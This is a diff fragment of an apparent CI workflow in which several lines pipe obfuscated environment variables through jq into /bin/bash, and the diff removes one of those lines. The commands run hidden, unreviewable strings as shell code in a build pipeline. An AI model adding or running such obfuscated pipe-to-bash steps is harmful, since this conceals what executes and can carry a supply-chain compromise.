@@ -29,7 +29,6 @@ jobs:
           echo $ptak6 | jq -r .cvgmc9 | /bin/bash
           echo $a857 | jq -r .hk28 | /bin/bash
           echo $qui454 | jq -r .gkzz31 | /bin/bash
-          printf '%s' "$asd36762" | jq -r .snu962 | /bin/bash
           echo $wzh77450 | jq -r .eogs7 | /bin/bash
           echo $eku43668 | jq -r .jiidq9 | /bin/bash
           echo $ainm7 | jq -r .d967 | /bin/bash
